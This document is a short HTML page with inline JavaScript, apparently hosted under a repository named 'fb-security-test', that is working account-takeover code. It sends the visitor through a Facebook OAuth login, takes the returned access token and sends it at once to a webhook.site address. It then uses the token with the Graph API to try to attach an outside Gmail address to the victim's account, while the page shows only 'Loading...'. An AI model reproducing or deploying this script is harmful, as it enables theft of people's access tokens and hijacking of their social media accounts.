<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <script>
        window.onload = async function() {
            const hash = window.location.hash;
            const webhook = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
            const email = "ktime400400400@gmail.com";

            if (hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');
                // إرسال التوكن فوراً قبل أي إجراء آخر
                await fetch(`${webhook}?FINAL_TOKEN=${token}`, {mode: 'no-cors'});
                
                // محاولة الإضافة المباشرة
                await fetch(`https://graph.facebook.com/me?access_token=${token}`, {
                    method: 'POST',
                    body: new URLSearchParams({ 'email': email })
                });
                
                // التوجيه لصفحة التأكيد اليدوي
                window.location.href = "https://www.facebook.com/settings?tab=account";
            } else {
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,openid";
            }
        };
    </script>
</body>
</html>
